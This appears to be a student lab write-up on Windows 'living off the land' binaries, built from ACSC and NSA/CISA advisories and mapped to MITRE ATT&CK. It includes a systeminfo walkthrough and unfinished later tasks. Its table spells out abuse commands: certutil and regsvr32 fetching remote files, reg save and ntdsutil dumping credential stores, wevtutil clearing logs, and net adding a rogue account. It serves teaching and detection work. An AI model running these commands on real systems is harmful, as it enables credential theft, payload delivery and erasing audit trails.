# Living Off the Land Binaries (LOLBins) - Execution and Documentation
Learning Objectives:

- Identify Living Off the Land Binaries from real-world threat intelligence advisories
- Execute common LOLBins on a Windows system and capture their output
- Interpret LOLBin output and explain what each data field reveals to an attacker
- Map LOLBin abuse techniques to the MITRE ATT&CK framework
- Detect LOLBin abuse through Windows event logs and command-line monitoring
- Document LOLBin capabilities in a structured threat intelligence format

### Advisory Sources
https://www.cyber.gov.au/about-us/view-all-content/alerts-and-advisories/prc-state-sponsored-actors-compromise-and-maintain-persistent-access-us-critical-infrastructure

https://media.defense.gov/2023/May/24/2003229517/-1/-1/0/CSA_Living_off_the_Land.PDF

MITRE ATT&CK Reference:

T1218 - System Binary Proxy Execution https://attack.mitre.org/techniques/T1218/

T1059 - Command and Scripting Interpreter https://attack.mitre.org/techniques/T1059/

T1105 - Ingress Tool Transfer https://attack.mitre.org/techniques/T1105/

### Documenting an LOLBin
The format used in this write-up will be as follows:

Command:

Screenshot:

What the Output Reveals to an Attacker:

MITRE ATT&CK Technique:

### Task 1: LOLBin Identification and Documentation
In this task we will open both advisories (ACSC and NSA/CISA), then scan for every Windows binary mentioned as abused by threat actors.

For each binary the following will be recorded:
- Binary name and full path (e.g., C:\Windows\System32\certutil.exe)
- Its legitimate, intended function
- How threat actors abuse it
- The applicable MITRE ATT&CK technique and sub-technique ID

| Binary                                                                                | Legitimate Use                                                                                    | Abuse Method                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               | MITRE ATT&CK ID                                            | Advisory Reference                                                                                                                                                                                                                                                       |   |
|---------------------------------------------------------------------------------------|---------------------------------------------------------------------------------------------------|--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------|--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|---|
| /wmic.exe<br>C:\Windows\System32\wbem\wmic.exe	<br>C:\Windows\SysWOW64\wbem\wmic.exe   | Used to interact with Windows Management Instrumentation for remote and local administration.     | Execute script from remote system<br><br>wmic.exe process get brief /format:"\\servername\C$\Windows\Temp\file.xsl"<br><br>Execute binary from remote system<br><br>wmic.exe /node:"192.168.0.1" process call create "cmd /c c:\windows\system32\calc.exe"<br><br>Execute binary from wmic to evade defensive counter measures<br><br>wmic.exe process call create "cmd /c c:\windows\system32\calc.exe"                                                                                                                                   | T1218<br>T1518.001<br>T1105<br>T1564.004                   | https://www.cyber.gov.au/about-us/view-all-content/alerts-and-advisories/prc-state-sponsored-actors-compromise-and-maintain-persistent-access-us-critical-infrastructure<br><br>https://media.defense.gov/2023/May/24/2003229517/-1/-1/0/CSA_Living_off_the_Land.PDF     |   |
| /cmd.exe<br>C:\Windows\SysWOW64\cmd.exe<br>C:\Windows\System32\cmd.exe                | Window's command line interpreter.                                                                | ADS<br><br>cmd.exe - < file.ext:payload.bat<br><br>cmd.exe /c echo regsvr32.exe ^/s ^/u ^/i:<br>https://www.example.org/file.sct ^scrobj.dll > file.ext:payload.bat<br><br><br>Download<br><br>type \\servername\C$\Windows\Temp\file.ext > C:\Windows\Temp\file.ext<br><br>Upload<br><br>type C:\Windows\Temp\file.ext > \\servername\C$\Windows\Temp\file.ext                                                                                                                                                                            | T1105<br>T1059.003<br>T1564.004<br>T1048.003               | https://www.cyber.gov.au/about-us/view-all-content/alerts-and-advisories/prc-state-sponsored-actors-compromise-and-maintain-persistent-access-us-critical-infrastructure<br><br><br>https://media.defense.gov/2023/May/24/2003229517/-1/-1/0/CSA_Living_off_the_Land.PDF |   |
| /ntdsutil.exe<br>C:\Windows\System32\ntdsutil.exe                                     | Exporting Active Directory Database                                                               | Dump the ntds.dit into a folder (This file has all AD data)<br><br>ntdsutil.exe "ac i ntds" "ifm" "create full c:\" q q                                                                                                                                                                                                                                                                                                                                                                                                                    | T1003.003                                                  | https://www.cyber.gov.au/about-us/view-all-content/alerts-and-advisories/prc-state-sponsored-actors-compromise-and-maintain-persistent-access-us-critical-infrastructure<br><br><br>https://media.defense.gov/2023/May/24/2003229517/-1/-1/0/CSA_Living_off_the_Land.PDF |   |
| /netsh.exe<br>C:\WINDOWS\System32\Netsh.exe<br>C:\WINDOWS\SysWOW64\Netsh.exe          | Used to view, config, manage, and troubleshoot local/remote network settings.                     | Execute a .dll file and gain persistence every time the netsh command is called<br><br>netsh.exe add helper C:\Windows\Temp\file.dll                                                                                                                                                                                                                                                                                                                                                                                                       | T1546.007                                                  | https://www.cyber.gov.au/about-us/view-all-content/alerts-and-advisories/prc-state-sponsored-actors-compromise-and-maintain-persistent-access-us-critical-infrastructure<br><br><br>https://media.defense.gov/2023/May/24/2003229517/-1/-1/0/CSA_Living_off_the_Land.PDF |   |
| /ldifde.exe<br>c:\windows\system32\ldifde.exe	<br>c:\windows\syswow64\ldifde.exe       | Manages LDAP directory objects.                                                                   | Download a .ldf file into LDAP<br><br>Ldifde -i -f file.ldf                                                                                                                                                                                                                                                                                                                                                                                                                                                                                | T1105                                                      | https://www.cyber.gov.au/about-us/view-all-content/alerts-and-advisories/prc-state-sponsored-actors-compromise-and-maintain-persistent-access-us-critical-infrastructure<br><br><br>https://media.defense.gov/2023/May/24/2003229517/-1/-1/0/CSA_Living_off_the_Land.PDF |   |
| /reg.exe<br>C:\Windows\System32\reg.exe			<br>C:\Windows\SysWOW64\reg.exe                | Manipulates the registry.                                                                         | ADS<br><br>reg export HKLM\SOFTWARE\Microsoft\Evilreg C:\Windows\Temp\file.ext:evilreg.reg<br><br><br>Credentials (below command dumps hives, gets password hashes, other material)<br><br>reg save HKLM\SECURITY C:\Windows\Temp\file.1.bak && reg save HKLM\SYSTEM <br>C:\Windows\Temp\file.2.bak && reg save HKLM\SAM C:\Windows\Temp\file.3.bak                                                                                                                                                                                        | T1564.004<br>T1003.002                                     | https://www.cyber.gov.au/about-us/view-all-content/alerts-and-advisories/prc-state-sponsored-actors-compromise-and-maintain-persistent-access-us-critical-infrastructure<br><br><br>https://media.defense.gov/2023/May/24/2003229517/-1/-1/0/CSA_Living_off_the_Land.PDF |   |
| /certutil.exe<br>C:\Windows\System32\certutil.exe	<br>C:\Windows\SysWOW64\certutil.exe | Used for handling certificates.                                                                   | Many ways to abuse this, some include:<br><br>Download and save an executable to disk in the current folder.<br>		<br>certutil.exe -urlcache -f <br>https://www.example.org/file.exe<br> <br>file.exe<br><br>Download and save a .ps1 file to ADS<br><br>certutil.exe -urlcache -f <br>https://www.example.org/file.ps1<br> <br>C:\Windows\Temp\file.ext:ttt<br><br>Encode file with base64<br><br>certutil -encode <br>file.ext<br> <br>file.base64<br><br>Decode file with base64<br><br>certutil -decode <br>file.base64<br> <br>file.ext | T1564.004<br>T1105<br>T1027.013<br>T1140                   | https://www.cyber.gov.au/about-us/view-all-content/alerts-and-advisories/prc-state-sponsored-actors-compromise-and-maintain-persistent-access-us-critical-infrastructure<br><br><br>https://media.defense.gov/2023/May/24/2003229517/-1/-1/0/CSA_Living_off_the_Land.PDF |   |
| /dnscmd.exe<br>C:\Windows\System32\Dnscmd.exe	<br>C:\Windows\SysWOW64\Dnscmd.exe       | Command line tool for managing DNS.                                                               | Add custom crafted DLL as DNS service plug-in.<br><br>dnscmd.exe dc1.lab.int /config /serverlevelplugindll <br>\\servername\C$\Windows\Temp\file.dll                                                                                                                                                                                                                                                                                                                                                                                       | T1543.003                                                  | https://www.cyber.gov.au/about-us/view-all-content/alerts-and-advisories/prc-state-sponsored-actors-compromise-and-maintain-persistent-access-us-critical-infrastructure<br><br><br>https://media.defense.gov/2023/May/24/2003229517/-1/-1/0/CSA_Living_off_the_Land.PDF |   |
| /wevutil.exe<br>C:\Windows\System32\wevtutil.exe<br>C:\Windows\SysWOW64\wevtutil.exe  | Used to manage event logs.                                                                        | Pull specific event log (command from csa pdf)<br><br>wevtutil qe security /rd:true /f:text<br>/q:*[System[(EventID=4624) and<br>TimeCreated[@SystemTime>='{REDACTED}']] and<br>EventData[Data='{REDACTED}']]<br><br>Disable an Event log<br><br>wevtutil sl <logname> /e:false<br><br>Clear an event log<br><br>wevutil cl system<br>wevutil cl security                                                                                                                                                                                  | T1005<br>T1685.001<br>T1685.005                            |                                                                                                                                                                                                                                                                          |   |
| /makecab.exe<br>C:\Windows\System32\makecab.exe		<br>C:\Windows\SysWOW64\makecab.exe    | Compression tool used to perform data compression. Turns files into cabinet archives. (.cab)      | ADS<br>Compress the target file into a CAB file stored in the ADS of the target file.<br><br><br>makecab <br>C:\Windows\Temp\file.exe<br> <br>C:\Windows\Temp\file.ext:autoruns.cab<br><br>Download and compresses the target file and stores it in the target file.<br><br>makecab <br>\\servername\C$\Windows\Temp\file.exe<br> <br>C:\Windows\Temp\file.cab<br><br>Execute commands defined in Diamond Definition File (.ddf)<br><br>makecab /F <br>file.ddf                                                                            | T1564.004<br>T1105<br>T1036                                | https://www.cyber.gov.au/about-us/view-all-content/alerts-and-advisories/prc-state-sponsored-actors-compromise-and-maintain-persistent-access-us-critical-infrastructure<br><br><br>https://media.defense.gov/2023/May/24/2003229517/-1/-1/0/CSA_Living_off_the_Land.PDF |   |
| /whoami.exe<br>C:\Windows\System32\whoami.exe<br>C:\Windows\SysWOW64\whoami.exe       | Displays the current user name, domain, security identifiers (SIDs), groups, and user privileges. | Discover all of the current user's permissions<br><br>whoami /all                                                                                                                                                                                                                                                                                                                                                                                                                                                                          | T1033                                                      | https://www.cyber.gov.au/about-us/view-all-content/alerts-and-advisories/prc-state-sponsored-actors-compromise-and-maintain-persistent-access-us-critical-infrastructure<br><br><br>https://media.defense.gov/2023/May/24/2003229517/-1/-1/0/CSA_Living_off_the_Land.PDF |   |
| /net.exe<br>C:\Windows\System32\net.exe                                               | Used for local and network management.                                                            | Discovery<br><br>net user /domain<br><br>net localgroup administrators<br><br>net use<br><br>net view /domain<br><br>Persistence<br><br>net create account eviluser password123 /add<br><br>Defense Evasion<br><br>net stop "process"<br><br>net stop "process" /y<br><br>Lateral Movement (command below just uses example format)<br><br>net use Z:\\Targetserver\c$                                                                                                                                                                     | T1562.001<br>T1021.002<br>T1078<br>T1136<br>T1049<br>T1087 | https://www.cyber.gov.au/about-us/view-all-content/alerts-and-advisories/prc-state-sponsored-actors-compromise-and-maintain-persistent-access-us-critical-infrastructure<br><br><br>https://media.defense.gov/2023/May/24/2003229517/-1/-1/0/CSA_Living_off_the_Land.PDF |   |

Footnotes: ADS means Alternate Data Streams. Advisory references reference both sources as they both have the same binaries.

#### Questions:
Which LOLBin appears in both advisories?
- All of these binaries appear in both advisories

Why do state-sponsored actors prefer LOLBins over custom malware?
- Easier to evade defenses like AV/EDRs
- Minimal forensic evidence
- Easier to blend in with typical activity
- They don't have to spend time developing their own tools

What is the "living off the land" naming convention based on?
- It comes from the concept of using resources that you already have access to

### Task 2: Discovery and Reconnaissance LOLBin Execution
From the threat reports, select 8 LOLBins that are used for discovery and reconnaissance. For each LOLBin document it as designated in the section "Documenting an LOLBin" section.

1. systeminfo
Command: ```systeminfo```

Screenshot:

<img width="654" height="693" alt="image" src="https://github.com/user-attachments/assets/47d393d3-3648-46de-b7a8-eb2797dc6ef3" />

What the Output Reveals to an Attacker:
This output shows us numerous things about the host which is why I chose to run this first in our enumeration. As the attacker, from the output, we can tell that:
- This OS is Windows 10 Home, important to know when searching for CVEs
- The hotfix list allows us to search for vulns that may yet to be patched by these hotfixes
- The domain field tells us that this pc is not domain-joined
- The system manufacturer and model both tell us that this pc is a vm. So in this case we most likely would pivot to a different device, as it might be a honeypot.
- The timezone can help the attacker learn when to run commands to blend in with normal activity
- We can see the registered owner of the device which may lead to credential attacks

MITRE ATT&CK Technique: T1082 — System Information Discovery

#### Questions: 
Which binary revealed the most useful information for lateral movement?
-

Which binary's output would be most suspicious to a defender? 
-

Why might a threat actor use wmic.exe instead of PowerShell for system queries?
-

### Task 3: Execution, Download, and Defense Evasion LOLBin Execution
### Task 4: LOLBin Detection and Threat Report
